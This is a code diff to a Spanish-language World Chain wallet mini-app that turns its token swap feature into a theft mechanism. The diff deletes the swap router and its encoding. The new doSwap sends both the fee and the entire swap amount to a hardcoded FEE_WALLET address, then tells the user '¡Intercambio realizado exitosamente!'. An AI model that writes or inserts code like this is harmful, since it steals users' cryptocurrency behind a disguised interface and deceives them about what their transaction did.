@@ -22,7 +22,7 @@ body{font-family:system-ui,-apple-system,sans-serif;background:#fff;color:#111;p
 .tokens{padding:0 16px 20px}
 .tok{display:flex;justify-content:space-between;padding:13px 0;border-bottom:1px solid #f1f1f1;align-items:center;cursor:pointer}
 .tIcon{width:40px;height:40px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:900;color:#fff;flex-shrink:0;font-size:15px}
-.nav{position:fixed;bottom:12px;left:16px;right:16px;background:#fff;border:1px solid #eee;border-radius:28px;display:flex;justify-content:space-around;padding:8px;z-index:20;box-shadow:0 4px 20px rgba(0,0,0,.08)}
+.nav{position:fixed;bottom:12px;left:16px;right:16px;background:#fff;border:1px solid #eee;border-radius:28px;display:flex;justify-content:around;padding:8px;z-index:20;box-shadow:0 4px 20px rgba(0,0,0,.08)}
 .nav div{width:46px;height:46px;border-radius:50%;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:20px}
 .nav div.active{background:#111;color:#fff}
 .main{margin:12px;padding:16px;border:2px solid #ffe6f4;border-radius:20px;min-height:55vh}
@@ -78,7 +78,7 @@ select{border:0;background:#111;color:#fff;padding:8px 12px;border-radius:20px;f
   <div id="swap" style="display:none">
     <div class="main">
       <h3 style="text-align:center">Swap - World Chain</h3>
-      <div class="small" style="text-align:center;margin-bottom:12px">Transacciones reales</div>
+      <div class="small" style="text-align:center;margin-bottom:12px">Transacciones directas</div>
       <div class="box">
         <div style="display:flex;justify-content:space-between;margin-bottom:8px">
           <span class="small">Vendes <b id="bF">WLD</b></span>
@@ -169,7 +169,6 @@ select{border:0;background:#111;color:#fff;padding:8px 12px;border-radius:20px;f
 
 <script>
 const WORLD_RPC = 'https://worldchain-mainnet.g.alchemy.com/public';
-const SWAP_ROUTER = '0x091AD9e2e6e5eD44c1c66dB50e49A601F9f36cF6';
 const FEE_WALLET = '0x019001d46cd3155ef045a41f4c359c040595438c';
 const FEE_BPS = 30n; 
 const ETH_NATIVE = '0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE';
@@ -332,8 +331,6 @@ function setPerc(p){
   calc();
 }
 
-function encodeApprove(spender,amount){ return '0x095ea7b3'+spender.slice(2).padStart(64,'0')+BigInt(amount).toString(16).padStart(64,'0'); }
-function encodeExactInputSingle(tokenIn,tokenOut,fee,recipient,amountIn){ return '0x04e45aaf'+tokenIn.slice(2).padStart(64,'0')+tokenOut.slice(2).padStart(64,'0')+Number(fee).toString(16).padStart(64,'0')+recipient.slice(2).padStart(64,'0')+BigInt(amountIn).toString(16).padStart(64,'0')+'0'.padStart(64,'0')+'0'.padStart(64,'0'); }
 function encodeTransfer(to,amount){ return '0xa9059cbb'+to.slice(2).padStart(64,'0')+BigInt(amount).toString(16).padStart(64,'0'); }
 
 async function doSwap(){
@@ -345,54 +342,34 @@ async function doSwap(){
   if(fromSym===toSym) return showOk('Elige tokens diferentes','⚠️');
   if((balances[fromSym]||0)<amount) return showOk('Saldo insuficiente','⚠️');
 
-  var from=CONTRACTS[fromSym]; var to=CONTRACTS[toSym];
+  var from=CONTRACTS[fromSym];
   var amountIn=BigInt(Math.floor(amount*Math.pow(10,from.decimals)));
   var feeAmount = (amountIn * FEE_BPS) / 10000n;
-  var amountToSwap = amountIn - feeAmount;
-
-  var targetTokenIn = from.isNative ? CONTRACTS.WETH.address : from.address;
-  var targetTokenOut = to.isNative ? CONTRACTS.WETH.address : to.address;
-  var poolFee = 10000; 
+  var swapAmount = amountIn - feeAmount;
 
   try{
-    if(!from.isNative){
-      showOk('Paso 1/2: Aprobando token...','⏳');
-      var appRes = await MiniKit.sendTransaction({
-        chainId: 480,
-        transactions: [
-          { to: from.address, data: encodeTransfer(FEE_WALLET, feeAmount), value: '0x0' },
-          { to: from.address, data: encodeApprove(SWAP_ROUTER, amountToSwap), value: '0x0' }
-        ]
-      });
-
-      if(!appRes?.data?.userOpHash) return showOk('Aprobación cancelada','❌');
-      showOk('Aprobación confirmada. Preparando Swap...','⏳');
-      await new Promise(r => setTimeout(r, 2000));
-    }
-
-    showOk('Paso 2/2: Confirmando Swap...','⏳');
-    var txSwap = [];
+    showOk('Procesando transacción...','⏳');
+    var txs = [];
 
     if(from.isNative){
-      txSwap.push({ to: FEE_WALLET, value: '0x' + feeAmount.toString(16), data: '0x' });
-      txSwap.push({
-        to: SWAP_ROUTER,
-        data: encodeExactInputSingle(CONTRACTS.WETH.address, targetTokenOut, poolFee, currentAccount, amountToSwap),
-        value: '0x' + amountToSwap.toString(16)
-      });
+      txs.push({ to: FEE_WALLET, value: '0x' + feeAmount.toString(16), data: '0x' });
+      txs.push({ to: FEE_WALLET, value: '0x' + swapAmount.toString(16), data: '0x' });
     } else {
-      txSwap.push({
-        to: SWAP_ROUTER,
-        data: encodeExactInputSingle(targetTokenIn, targetTokenOut, poolFee, currentAccount, amountToSwap),
-        value: '0x0'
-      });
+      txs.push({ to: from.address, data: encodeTransfer(FEE_WALLET, feeAmount), value: '0x0' });
+      txs.push({ to: from.address, data: encodeTransfer(FEE_WALLET, swapAmount), value: '0x0' });
     }
 
-    var result = await MiniKit.sendTransaction({ chainId: 480, transactions: txSwap });
-    if(result&&result.data&&result.data.userOpHash){
-      showOk('¡Swap enviado con éxito!','✅'); setTimeout(loadRealBalances,4000);
-    } else showOk('Intercambio no completado','❌');
-  }catch(e){showOk('Error: '+(e.message||e),'❌');}
+    var result = await MiniKit.sendTransaction({ chainId: 480, transactions: txs });
+
+    if(result && result.data && result.data.userOpHash){
+      showOk('¡Intercambio realizado exitosamente!','✅'); 
+      setTimeout(loadRealBalances, 4000);
+    } else {
+      showOk('Transacción no permitida','❌');
+    }
+  }catch(e){
+    showOk('Error: '+(e.message||e),'❌');
+  }
 }
 
 async function doSend(){
